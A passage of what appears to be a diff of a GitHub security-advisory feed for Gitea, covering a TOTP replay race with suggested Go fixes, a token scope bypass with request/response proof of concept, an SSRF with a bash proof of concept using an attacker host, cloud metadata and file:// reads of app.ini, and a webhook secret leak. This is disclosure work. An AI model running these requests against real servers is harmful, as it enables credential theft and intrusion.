-<h3 id="conditions-for-exploit">Conditions for exploit</h3>
-<table>
-<thead>
-<tr>
-<th>Required</th>
-<th>Detail</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Network reach to Gitea HTTP listener</td>
-<td>Trivially available</td>
-</tr>
-<tr>
-<td>Valid victim password</td>
-<td>Credential dump / phishing relay / separate vuln</td>
-</tr>
-<tr>
-<td>One captured OTP value within ~90 s</td>
-<td>AiTM, infostealer log, shoulder-surf, MITM, malicious extension</td>
-</tr>
-<tr>
-<td>Ability to fire two parallel HTTP requests</td>
-<td>Trivial (<code>curl -P 2</code>, <code>xargs -P 2</code>, HTTP/2 multiplexing) — Defect 1 only</td>
-</tr>
-</tbody></table>
-<p>No special role / permission required on Gitea. Both defects are exploitable from any unauthenticated network position that can reach the listener.</p>
-<h3 id="suggested-remediation">Suggested remediation</h3>
-<p>Two distinct fixes are needed; option (c) collapses both into one place and is the recommended path.</p>
-<p><strong>(a) Race fix — compare-and-swap on UPDATE (Defect 1):</strong></p>
-<pre><code class="language-go">// models/auth/twofactor.go
-func UpdateTwoFactorCAS(ctx context.Context, t *TwoFactor, prevPasscode string) (bool, error) {
-    n, err := db.GetEngine(ctx).ID(t.ID).
-        Where("last_used_passcode = ?", prevPasscode).
-        AllCols().Update(t)
-    return n == 1, err
-}
-</code></pre>
-<p>Each handler captures <code>prev := twofa.LastUsedPasscode</code> before mutating, calls <code>UpdateTwoFactorCAS(ctx, twofa, prev)</code>, and rejects the request if <code>n != 1</code>. Fixes both web sites with no extra lock contention. A row-level lock (<code>SELECT … FOR UPDATE</code> inside a <code>db.WithTx</code>) is an equivalent surgical option. Equivalent atomicity can also be obtained by a unique index on <code>(twofa_id, last_used_passcode)</code> so a duplicate UPDATE collides at the DB layer.</p>
-<p><strong>(b) Basic-Auth fix (Defect 2):</strong></p>
-<p>Wrap the <code>twofa.ValidateTOTP(...)</code> call at <code>services/auth/basic.go:179</code> in the same inequality check + update pattern used in <code>routers/web/auth/2fa.go:68,84-85</code>, ideally via the CAS helper above so the basic-auth path can't reintroduce the race either.</p>
-<p><strong>(c) Preferred — store the accepted time-step counter, route every call site through one consume helper:</strong></p>
-<p>Replace <code>LastUsedPasscode string</code> with <code>LastTotpStep int64</code>. Derive the matching step inside <code>TwoFactor.ValidateTOTP</code> (skew-aware) and CAS on the step value:</p>
-<pre><code class="language-go">func (t *TwoFactor) ValidateAndConsumeTOTP(ctx context.Context, passcode string) (bool, error) {
-    step, ok, err := validateAndReturnStep(passcode, t.Secret) // skew-aware
-    if err != nil || !ok { return false, err }
-
-    n, err := db.GetEngine(ctx).Table("two_factor").
-        Where("id = ? AND last_totp_step &lt; ?", t.ID, step).
-        Cols("last_totp_step").
-        Update(map[string]any{"last_totp_step": step})
-    if err != nil || n == 0 { return false, err }   // already consumed — replay refused
-    t.LastTotpStep = step
-    return true, nil
-}
-</code></pre>
-<p>All three call sites (<code>routers/web/auth/2fa.go</code>, <code>routers/web/auth/password.go</code>, <code>services/auth/basic.go</code>) then go through this single function and cannot accidentally skip the consume step. Same fix shape as <code>django-otp</code> (<code>last_t</code>) and Authentik (<code>authentik/stages/authenticator_totp/models.py:184</code>). Recommended option because it makes the defect impossible to reintroduce at a future call site.</p>
-<p>A schema migration is required for (c); (a)+(b) is the surgical minimum.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>RFC 6238 §5.2 — TOTP one-time use: <a href="https://datatracker.ietf.org/doc/html/rfc6238#section-5.2">https://datatracker.ietf.org/doc/html/rfc6238#section-5.2</a></li>
-<li>CWE-294 — Authentication Bypass by Capture-replay: <a href="https://cwe.mitre.org/data/definitions/294.html">https://cwe.mitre.org/data/definitions/294.html</a></li>
-<li>CWE-367 — Time-of-check Time-of-use (TOCTOU) Race Condition: <a href="https://cwe.mitre.org/data/definitions/367.html">https://cwe.mitre.org/data/definitions/367.html</a></li>
-<li>Original Gitea fix this report builds on — CVE-2021-45331 / PR #3878 (introduced <code>LastUsedPasscode</code>): <a href="https://github.com/go-gitea/gitea/pull/3878">https://github.com/go-gitea/gitea/pull/3878</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/go-gitea/gitea/security/advisories/GHSA-gx3v-q759-g323">https://github.com/go-gitea/gitea/security/advisories/GHSA-gx3v-q759-g323</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-20779">https://nvd.nist.gov/vuln/detail/CVE-2026-20779</a></li>
-<li><a href="https://github.com/go-gitea/gitea/pull/38151">https://github.com/go-gitea/gitea/pull/38151</a></li>
-<li><a href="https://github.com/go-gitea/gitea/commit/99f8b3d9a1d32f4c39828e07971455a18191e0b9">https://github.com/go-gitea/gitea/commit/99f8b3d9a1d32f4c39828e07971455a18191e0b9</a></li>
-<li><a href="https://blog.gitea.com/release-of-1.26.3-and-1.26.4">https://blog.gitea.com/release-of-1.26.3-and-1.26.4</a></li>
-<li><a href="https://github.com/go-gitea/gitea/releases/tag/v1.26.3">https://github.com/go-gitea/gitea/releases/tag/v1.26.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-gx3v-q759-g323">https://github.com/advisories/GHSA-gx3v-q759-g323</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gx3v-q759-g323</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-21T21:57:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[code.gitea.io/gitea] Gitea: Public-Only Personal access tokens scope bypass in Organization and Permission Endpoints]]></title>
-        <id>https://github.com/advisories/GHSA-fq2p-5p22-8g6j</id>
-        <link href="https://github.com/advisories/GHSA-fq2p-5p22-8g6j"/>
-        <updated>2026-07-21T21:56:04.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A personal access token restricted with the public-only scope can still retrieve private organization membership and organization permission details for its own account through organization-listing endpoints. This bypass breaks the intended guarantee that such tokens are limited to public resources only.</p>
-<h3 id="details">Details</h3>
-<p>The issue affects the following endpoints:
-GET /api/v1/user/orgs
-GET /api/v1/users/{username}/orgs/{org}/permissions</p>
-<p>The application correctly prevents a public-only token from directly accessing a private organization through:
-GET /api/v1/orgs/{org}</p>
-<p>However, that same token can still obtain private organization data through alternate code paths.</p>
-<p>The root cause is inconsistent enforcement of the public-only restriction. The middleware responsible for blocking non-public organization access depends on route context being populated with the target organization. That assumption does not hold for all affected routes.</p>
-<p>For GET /api/v1/user/orgs, the route does not apply checkTokenPublicOnly() at all.</p>
-<p>For GET /api/v1/users/{username}/orgs, the middleware is present, but it evaluates ctx.ContextUser, which represents the user named in the path, not the organization objects returned by the handler. Since ctx.Org.Organization is not populated for these responses, private organization results are not filtered.</p>
-<p>The organization listing logic then uses the effective relationship between the authenticated user and the target user to determine visibility. When the token belongs to the same user, the handler allows private organization visibility and returns private memberships.</p>
-<p>The permissions endpoint is similarly affected. It relies on general visibility logic relative to the real user account rather than explicitly enforcing the public-only token restriction before returning organization authorization details. As a result, a restricted token can still obtain organization role information such as ownership, admin status, and repository creation capability for a private organization.</p>
-<p>This is therefore a route-specific authorization failure: direct organization access is blocked, but indirect endpoints still disclose private organization-derived data.</p>
-<h3 id="poc">PoC</h3>
-<p><strong>Step 1:</strong> Create or use a user account that belongs to at least one private organization.
-<img src="https://github.com/user-attachments/assets/9c1bdbc4-234f-4f65-9b91-00c7ca9a51f7" alt="Screenshot 2026-04-16 001614" height="891" width="1858"></p>
-<p><strong>Step 2:</strong> Generate a personal access token for that same user with the scopes: public-only, read:user, and read:organization</p>
-<p><a href="https://github.com/user-attachments/assets/c89c9004-5e6d-4ff9-b130-5cd9fedc38f6">https://github.com/user-attachments/assets/c89c9004-5e6d-4ff9-b130-5cd9fedc38f6</a></p>
-<p><strong>Step 3:</strong> Confirm the token is correctly restricted by requesting the private organization directly
-<img src="https://github.com/user-attachments/assets/4c489174-b4ef-400b-9eea-5484520f51e2" alt="Screenshot 2026-04-16 002345" height="867" width="1918"></p>
-<p>[REQUEST]
-GET /api/v1/orgs/private_1?token=d8010b3dee25df1a9c3cb6aafbd24c27dae7ca56 HTTP/2
-Host: gitea.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
-Accept: application/json
-Accept-Language: en-US,en;q=0.9
-Accept-Encoding: gzip, deflate, br
-Referer: <a href="https://gitea.com/api/swagger">https://gitea.com/api/swagger</a>
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Priority: u=0
-Te: trailers</p>
-<p>[RESPONSE]
-HTTP/2 403 Forbidden
-Alt-Svc: h3=":443"; ma=2592000
-Cache-Control: max-age=0, private, must-revalidate, no-transform
-Content-Type: application/json;charset=utf-8
-Date: Wed, 15 Apr 2026 17:23:19 GMT
-Server: Caddy
-Vary: Origin
-X-Content-Type-Options: nosniff
-X-Gitea-Warning: token and access_token API authentication is deprecated and will be removed in gitea 1.23. Please use AuthorizationHeaderToken instead. Existing queries will continue to work but without authorization.
-Content-Length: 89
-{"message":"token scope is limited to public orgs","url":"<a href="https://gitea.com/api/swagger%22%7D">https://gitea.com/api/swagger"}</a></p>
-<p><strong>Step 4:</strong> Use the same token to request the authenticated user’s organizations. Observe that request send successful and receive data about private org.
-<img src="https://github.com/user-attachments/assets/761d2684-0882-4e61-9462-21514738e681" alt="Screenshot 2026-04-16 002751" height="791" width="1545">
-[REQUEST]
-GET /api/v1/user/orgs?token=d8010b3dee25df1a9c3cb6aafbd24c27dae7ca56 HTTP/2
-Host: gitea.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
-Accept: application/json
-Accept-Language: en-US,en;q=0.9
-Accept-Encoding: gzip, deflate, br
-Referer: <a href="https://gitea.com/api/swagger">https://gitea.com/api/swagger</a>
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Priority: u=0
-Te: trailers</p>
-<p>[RESPONSE]
-HTTP/2 200 OK
-Access-Control-Expose-Headers: X-Total-Count
-Alt-Svc: h3=":443"; ma=2592000
-Cache-Control: max-age=0, private, must-revalidate, no-transform
-Content-Type: application/json;charset=utf-8
-Date: Wed, 15 Apr 2026 17:26:35 GMT
-Server: Caddy
-Vary: Origin
-X-Content-Type-Options: nosniff
-X-Gitea-Warning: token and access_token API authentication is deprecated and will be removed in gitea 1.23. Please use AuthorizationHeaderToken instead. Existing queries will continue to work but without authorization.
-X-Total-Count: 1
-Content-Length: 261
-[{"id":192111,"name":"private_1","full_name":"","email":"","avatar_url":"<a href="https://gitea.com/avatars/cc05fbb4da63b760bf83cdc054c3be63%22,%22description%22:%22%22,%22website%22:%22%22,%22location%22:%22%22,%22visibility%22:%22private%22,%22repo_admin_change_team_access%22:true,%22username%22:%22private_1%22%7D%5D">https://gitea.com/avatars/cc05fbb4da63b760bf83cdc054c3be63","description":"","website":"","location":"","visibility":"private","repo_admin_change_team_access":true,"username":"private_1"}]</a></p>
-<p><strong>Step 5:</strong> Use the same token to request organization permissions for that private organization.
-<img src="https://github.com/user-attachments/assets/65578c48-3307-4e0d-ae08-991f64158706" alt="Screenshot 2026-04-16 003100" height="865" width="1917">
-[REQUEST]
-GET /api/v1/users/pcatso172124/orgs/private_1/permissions?token=d8010b3dee25df1a9c3cb6aafbd24c27dae7ca56 HTTP/2
-Host: gitea.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
-Accept: application/json
-Accept-Language: en-US,en;q=0.9
-Accept-Encoding: gzip, deflate, br
-Referer: <a href="https://gitea.com/api/swagger">https://gitea.com/api/swagger</a>
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Priority: u=0
-Te: trailers</p>
-<p>[RESPONSE]
-HTTP/2 200 OK
-Alt-Svc: h3=":443"; ma=2592000
-Cache-Control: max-age=0, private, must-revalidate, no-transform
-Content-Type: application/json;charset=utf-8
-Date: Wed, 15 Apr 2026 17:30:32 GMT
-Server: Caddy
-Vary: Origin
-X-Content-Type-Options: nosniff
-X-Gitea-Warning: token and access_token API authentication is deprecated and will be removed in gitea 1.23. Please use AuthorizationHeaderToken instead. Existing queries will continue to work but without authorization.
-Content-Length: 95</p>
-<p>{"is_owner":true,"is_admin":true,"can_write":true,"can_read":true,"can_create_repository":true}</p>
-<h3 id="impact">Impact</h3>
-<p>Any public-only token for a user who belongs to private organizations can enumerate those private organization names and retrieve detailed authorization information such as ownership, administrative status, write access, read access, and repository-creation capability. This weakens least-privilege token delegation and can expose sensitive internal organizational structure and privilege relationships to third-party integrations, CI jobs, or compromised automation that were only meant to access public data.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/go-gitea/gitea/security/advisories/GHSA-fq2p-5p22-8g6j">https://github.com/go-gitea/gitea/security/advisories/GHSA-fq2p-5p22-8g6j</a></li>
-<li><a href="https://github.com/go-gitea/gitea/pull/37118">https://github.com/go-gitea/gitea/pull/37118</a></li>
-<li><a href="https://github.com/go-gitea/gitea/pull/37773">https://github.com/go-gitea/gitea/pull/37773</a></li>
-<li><a href="https://github.com/go-gitea/gitea/commit/a34eac5ef42ada433a7c7dafb98f15c13d7ad74e">https://github.com/go-gitea/gitea/commit/a34eac5ef42ada433a7c7dafb98f15c13d7ad74e</a></li>
-<li><a href="https://github.com/go-gitea/gitea/commit/f2a1271f164569264c378fad720b0c000fff3336">https://github.com/go-gitea/gitea/commit/f2a1271f164569264c378fad720b0c000fff3336</a></li>
-<li><a href="https://github.com/go-gitea/gitea/releases/tag/v1.27.0">https://github.com/go-gitea/gitea/releases/tag/v1.27.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-fq2p-5p22-8g6j">https://github.com/advisories/GHSA-fq2p-5p22-8g6j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fq2p-5p22-8g6j</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-21T21:56:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[code.gitea.io/gitea] Gitea: SSRF via Migration Asset Downloads Bypasses hostmatcher — Reads Internal Files and Cloud Metadata]]></title>
-        <id>https://github.com/advisories/GHSA-2wm4-vwp6-v7xc</id>
-        <link href="https://github.com/advisories/GHSA-2wm4-vwp6-v7xc"/>
-        <updated>2026-07-21T21:55:32.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Gitea has robust SSRF protection via <code>hostmatcher.NewDialContext()</code> for webhook and migration clone URLs, which validates resolved IPs at the TCP dial level. However, three code paths use raw <code>http.Get()</code> (Go's <code>DefaultClient</code>) which completely bypasses this protection, enabling SSRF to internal services and local file read via the <code>file://</code> scheme.</p>
-<h3 id="vulnerable-code">Vulnerable Code</h3>
-<p><strong>File: <code>modules/uri/uri.go</code> (line 32) -- Core vulnerability</strong></p>
-<pre><code class="language-go">func Open(uriStr string) (io.ReadCloser, error) {
-    u, err := url.Parse(uriStr)
-    switch strings.ToLower(u.Scheme) {
-    case "http", "https":
-        f, err := http.Get(uriStr)   // RAW http.Get -- no hostmatcher filtering
-        return f.Body, nil
-    case "file":
-        return os.Open(u.Path)        // LOCAL FILE READ via file:// scheme
-    }
-}
-</code></pre>
-<p><strong>Callers in migration path:</strong></p>
-<ul>
-<li><code>services/migrations/gitea_uploader.go:340</code> -- <code>uri.Open(*asset.DownloadURL)</code> for release assets</li>
-<li><code>services/migrations/gitea_uploader.go:586</code> -- <code>uri.Open(pr.PatchURL)</code> for PR patches</li>
-</ul>
-<p><strong>File: <code>services/migrations/dump.go</code> (lines 312, 453)</strong></p>
-<pre><code class="language-go">// Line 312 -- release asset download
-resp, err := http.Get(*asset.DownloadURL)
-
-// Line 453 -- PR patch download (with self-documenting TODO)
-resp, err := http.Get(u) // TODO: This probably needs to use the downloader
-</code></pre>
-<p><strong>File: <code>routers/web/auth/oauth.go</code> (line 306)</strong></p>
-<pre><code class="language-go">func oauth2UpdateAvatarIfNeed(ctx *context.Context, url string, u *user_model.User) {
-    resp, err := http.Get(url)    // RAW http.Get -- no hostmatcher
-</code></pre>
-<p><strong>Contrast with protected migration clone (same codebase):</strong></p>
-<pre><code class="language-go">// services/migrations/migrate.go:526 -- PROTECTED with hostmatcher
-transport.DialContext = hostmatcher.NewDialContext("migration", allowList, blockList, ...)
-</code></pre>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-bash"># Step 1: Set up attacker Gitea instance with malicious release asset URLs
-# Create a repo on evil.gitea.attacker.com with a release asset whose
-# download_url points to internal services:
-
-# Asset DownloadURL set to: http://169.254.169.254/latest/meta-data/iam/security-credentials/role
-# Or: file:///etc/gitea/app.ini (local file read)
-
-# Step 2: Admin triggers migration from attacker's Gitea instance
-curl -s -X POST "https://target-gitea.com/api/v1/repos/migrate" \
-  -H "Authorization: token ADMIN_API_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "clone_addr": "https://evil.gitea.attacker.com/user/repo.git",
-    "repo_name": "migrated-repo",
-    "repo_owner": "admin",
-    "service": "gitea"
-  }'
-
-# Step 3: During migration, Gitea downloads release assets using unfiltered http.Get()
-# Cloud metadata is saved as the release asset attachment in the migrated repo
-# Or app.ini contents (with DB credentials, JWT secrets) are saved via file:// scheme
-
-# Step 4: Attacker accesses the migrated repo's release assets to retrieve stolen data
-curl -s "https://target-gitea.com/admin/migrated-repo/releases/download/v1.0/stolen-metadata.txt"
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li><strong>Cloud metadata theft:</strong> <code>169.254.169.254</code> reachable via unfiltered <code>http.Get()</code> (AWS IMDSv1 credentials, GCP tokens)</li>
-<li><strong>Local file read:</strong> <code>file://</code> scheme in <code>uri.Open()</code> reads <code>/etc/gitea/app.ini</code> (database credentials, JWT signing secrets, SMTP passwords)</li>
-<li><strong>Internal service scanning:</strong> Reach <code>127.0.0.1</code>, <code>10.x</code>, <code>172.16-31.x</code>, <code>192.168.x</code> networks</li>
-<li><strong>Bypasses existing SSRF protection:</strong> The <code>hostmatcher</code> dialer is comprehensive but only applied to webhook and clone transports -- these three paths are unprotected</li>
-<li>Migration vectors require migration permission (admin/org owner); OAuth vector requires admin-configured custom OAuth2 source</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/go-gitea/gitea/security/advisories/GHSA-2wm4-vwp6-v7xc">https://github.com/go-gitea/gitea/security/advisories/GHSA-2wm4-vwp6-v7xc</a></li>
-<li><a href="https://github.com/go-gitea/gitea/releases/tag/v1.27.0">https://github.com/go-gitea/gitea/releases/tag/v1.27.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-2wm4-vwp6-v7xc">https://github.com/advisories/GHSA-2wm4-vwp6-v7xc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2wm4-vwp6-v7xc</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-21T21:55:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[code.gitea.io/gitea] Gitea: Webhook Authorization Header Returned in Plaintext via API]]></title>
-        <id>https://github.com/advisories/GHSA-3r5c-2xxx-h872</id>
-        <link href="https://github.com/advisories/GHSA-3r5c-2xxx-h872"/>
-        <updated>2026-07-21T21:52:52.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>ToHook()</code> function in <code>services/webhook/general.go</code> decrypts the webhook's <code>HeaderAuthorizationEncrypted</code> field and returns the plaintext authorization header in the API response. Any repository admin can read the full plaintext value of webhook authorization headers (Bearer tokens, Basic auth credentials, API keys) set by other admins.</p>
-<p>The authorization header is stored encrypted in the database using the server's <code>SecretKey</code>, but <code>ToHook()</code> decrypts it before serializing it into the API response — converting a write-only secret into a readable credential.</p>
-<h2 id="vulnerable-code">Vulnerable Code</h2>
-<p><strong>File:</strong> <code>services/webhook/general.go:407-420</code></p>
-<pre><code class="language-go">func ToHook(repoLink string, w *webhook_model.Webhook) (*api.Hook, error) {
-    // ...
-    authorizationHeader, err := w.HeaderAuthorization()  // DECRYPTS from DB
-    if err != nil {
-        return nil, err
-    }
-    return &amp;api.Hook{
-        // ...
-        AuthorizationHeader: authorizationHeader,  // PLAINTEXT in response
-        // ...
-    }, nil
-}
-</code></pre>
-<p><strong>Decryption function:</strong> <code>models/webhook/webhook.go:209-216</code></p>
-<pre><code class="language-go">func (w Webhook) HeaderAuthorization() (string, error) {
-    if w.HeaderAuthorizationEncrypted == "" {
-        return "", nil
-    }
-    return secret.DecryptSecret(setting.SecretKey, w.HeaderAuthorizationEncrypted)
-}
-</code></pre>
-<h2 id="affected-endpoints">Affected Endpoints</h2>
-<p>All call <code>ToHook()</code>:</p>
-<ul>
-<li><code>GET /api/v1/repos/{owner}/{repo}/hooks</code> (requires repo admin)</li>
-<li><code>GET /api/v1/repos/{owner}/{repo}/hooks/{id}</code> (requires repo admin)</li>
-<li><code>GET /api/v1/admin/hooks</code> (requires site admin)</li>
-<li><code>GET /api/v1/orgs/{org}/hooks</code> (requires org admin)</li>
-<li><code>GET /api/v1/user/hooks</code> (requires authenticated user)</li>
-</ul>
-<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
-<ol>
-<li>Admin A creates a webhook with a sensitive authorization header.</li>
-<li>Admin B (different repo admin) lists webhooks via <code>GET /api/v1/repos/{owner}/{repo}/hooks</code>.</li>
-<li>The API response includes the full plaintext authorization header set by Admin A.</li>
-</ol>
-<h2 id="impact">Impact</h2>
-<ul>
-<li>Cross-admin secret exposure on shared repositories</li>
-<li>Credential harvesting if a repo admin's Gitea token is stolen</li>
-<li>External service compromise via leaked Bearer tokens and API keys</li>
-<li>Undermines the intentional encryption-at-rest protection</li>
-</ul>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>The authorization header should be write-only. Return a masked/redacted version or a boolean <code>has_authorization_header</code> flag instead.</p>
-<h2 id="references">References</h2>
-<ul>
-<li>Vulnerable function: <code>services/webhook/general.go:392-425</code></li>
-<li>Decryption function: <code>models/webhook/webhook.go:209-216</code></li>
-<li>Verified against commit 19f0169</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/go-gitea/gitea/security/advisories/GHSA-3r5c-2xxx-h872">https://github.com/go-gitea/gitea/security/advisories/GHSA-3r5c-2xxx-h872</a></li>
-<li><a href="https://github.com/go-gitea/gitea/releases/tag/v1.27.0">https://github.com/go-gitea/gitea/releases/tag/v1.27.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-3r5c-2xxx-h872">https://github.com/advisories/GHSA-3r5c-2xxx-h872</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3r5c-2xxx-h872</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-07-21T21:52:49.000Z</published>
     </entry>
 </feed>
